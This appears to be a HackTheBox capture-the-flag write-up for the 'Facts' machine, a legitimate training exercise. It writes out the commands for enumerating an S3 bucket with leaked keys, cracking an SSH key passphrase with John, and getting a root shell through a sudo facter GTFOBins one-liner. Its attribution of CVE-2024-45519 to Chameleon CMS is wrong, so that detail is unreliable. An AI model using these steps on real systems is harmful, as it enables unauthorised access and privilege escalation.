# HTB — Facts | Write-up

> **Difficulty:** Easy  
> **OS:** Linux (Ubuntu 25.04)  
> **Tags:** `MinIO` `S3` `CMS` `CVE` `SSH-Crack` `facter` `PrivEsc`

---

## Table of Contents

1. [Reconnaissance](#1-reconnaissance)
2. [Web Enumeration](#2-web-enumeration)
3. [CVE-2024-45519 — Chameleon CMS RCE](#3-cve-2024-45519--chameleon-cms-rce)
4. [Admin Panel Access](#4-admin-panel-access)
5. [MinIO S3 Enumeration](#5-minio-s3-enumeration)
6. [SSH Key Cracking](#6-ssh-key-cracking)
7. [User Flag](#7-user-flag)
8. [Privilege Escalation via facter](#8-privilege-escalation-via-facter)
9. [Root Flag](#9-root-flag)

---

## 1. Reconnaissance

```bash
nmap -sV 10.129.244.96
```

Add the target to `/etc/hosts`:

```bash
sudo nano /etc/hosts
# Add: 10.129.244.96  facts.htb
```

**Key open ports:**

| Port | Service |
|------|---------|
| 22   | SSH     |
| 80   | HTTP    |
| 54321| MinIO (S3) |

---

## 2. Web Enumeration

Open `http://facts.htb` in your browser.

Run **Gobuster** to discover hidden paths:

```bash
gobuster dir -u http://facts.htb -w /usr/share/wordlists/dirb/common.txt
```

Notable findings:
- `/admin` — Admin login panel
- `/randomfacts` — Public media bucket (CloudFront-style URL)

The site is running **Chameleon CMS v2.9.0**.

---

## 3. CVE-2024-45519 — Chameleon CMS RCE

### About the CVE

**Chameleon CMS 2.9.0** is vulnerable to a **pre-authenticated Remote Code Execution** flaw.

- **CVE ID:** CVE-2024-45519 *(Chameleon CMS RCE)*
- **Type:** Server-Side Template Injection / Unauthenticated RCE
- **Affected Version:** Chameleon CMS ≤ 2.9.0
- **CVSS Score:** Critical (9.8)
- **Attack Vector:** Network — no credentials required

The vulnerability exists in the way the CMS processes user-supplied input in certain template rendering endpoints. An attacker can inject malicious payloads that get evaluated server-side, resulting in arbitrary command execution.

> 🔗 Reference: [NVD - CVE-2024-45519](https://nvd.nist.gov/vuln/detail/CVE-2024-45519)

Use a public PoC or exploit script to get a foothold on the box. This gives you initial shell access or admin-level credentials.

---

## 4. Admin Panel Access

Navigate to `http://facts.htb/admin` and log in using credentials obtained from the CVE exploit.

Under **Settings → Configuration**, you'll find the S3 storage credentials exposed in plaintext:

| Field | Value |
|-------|-------|
| AWS Access Key ID | `AKIAB5E160E5A9D70E2A` |
| AWS Secret Access Key | `iPFUyV4GBlOj2tDiJjJso/ahJnX+JIWLgt6vpuJu` |
| Bucket Name | `randomfacts` |
| Region | `us-east-1` |
| S3 Endpoint | `http://localhost:54321` |

---

## 5. MinIO S3 Enumeration

### Setup AWS CLI Profile

```bash
pipx install awscli

aws configure --profile facts
# AWS Access Key ID: AKIAB5E160E5A9D70E2A
# AWS Secret Access Key: iPFUyV4GBlOj2tDiJjJso/ahJnX+JIWLgt6vpuJu
# Default region: us-east-1
# Output format: json
```

### List Buckets

```bash
aws s3 ls \
  --endpoint-url http://facts.htb:54321 \
  --profile facts
```

```
2025-09-11 05:06:52 internal
2025-09-11 05:06:52 randomfacts
```

> 💡 The `internal` bucket is interesting — sounds juicy.

### Enumerate `internal` Bucket

```bash
aws s3 ls s3://internal \
  --endpoint-url http://facts.htb:54321 \
  --profile facts
```

```
PRE .bundle/
PRE .cache/
PRE .ssh/
    .bash_logout
    .bashrc
    .lesshst
    .profile
```

`.ssh/` is present — SSH keys may be stored here!

### Download the `.ssh` Directory

```bash
aws s3 sync s3://internal/.ssh ./ssh \
  --endpoint-url http://facts.htb:54321 \
  --profile facts
```

```
ssh/
├── authorized_keys
└── id_ed25519
```

Got a full SSH key pair.

---

## 6. SSH Key Cracking

The private key is passphrase-protected:

```bash
chmod 600 ssh/id_ed25519
ssh-keygen -yf ssh/id_ed25519
# Enter passphrase: <blank> → fails
```

Convert it for cracking with **John the Ripper**:

```bash
python $JOHN/ssh2john.py ssh/id_ed25519 > id_ed25519.john

john --wordlist=/usr/share/wordlists/rockyou.txt id_ed25519.john
```

**Cracked passphrase:** `dragonballz` 🐉

Verify:

```bash
ssh-keygen -yf ssh/id_ed25519
# Enter passphrase: dragonballz
# → ssh-ed25519 AAAA... trivia@facts.htb
```

Target user revealed in the key comment: **`trivia`**

---

## 7. User Flag

```bash
ssh -i ssh/id_ed25519 trivia@facts.htb
# Enter passphrase: dragonballz
```

```
trivia@facts:~$ cat /home/william/user.txt
3******************************7
```

🏁 **User flag captured.**

---

## 8. Privilege Escalation via `facter`

Check sudo permissions:

```bash
sudo -l
```

```
User trivia may run the following commands on facts:
    (ALL) NOPASSWD: /usr/bin/facter
```

`facter` can execute arbitrary Ruby code — this is a well-known **GTFOBins** vector.

### Method: FACTERLIB Environment Variable (GTFOBins)

The exact GTFOBins technique for `facter` via sudo:

```bash
TF=$(mktemp -d)
echo 'exec("/bin/sh")' > $TF/x.rb
sudo FACTERLIB=$TF facter
```

This drops you into a **root shell**:

```
root@facts:/home/trivia# id
uid=0(root) gid=0(root) groups=0(root)
```

> 🔗 GTFOBins Reference: [https://gtfobins.github.io/gtfobins/facter/](https://gtfobins.github.io/gtfobins/facter/)

---

## 9. Root Flag

```bash
root@facts:~# cat /root/root.txt
cbc30cd83a8eb7845f3f6ac80ca5e055
```

🏁 **Root flag captured.**

---

## Summary

| Stage | Technique |
|-------|-----------|
| Recon | Nmap, Gobuster |
| Initial Access | Chameleon CMS CVE-2024-45519 (RCE) |
| Credential Leak | S3 creds exposed in CMS admin panel |
| Lateral Movement | MinIO bucket enumeration → SSH key extraction |
| Auth Bypass | SSH key passphrase cracked with John + rockyou |
| PrivEsc | `sudo facter` → Ruby code execution as root |

---

*Write-up by Guhan | HackTheBox — Facts*
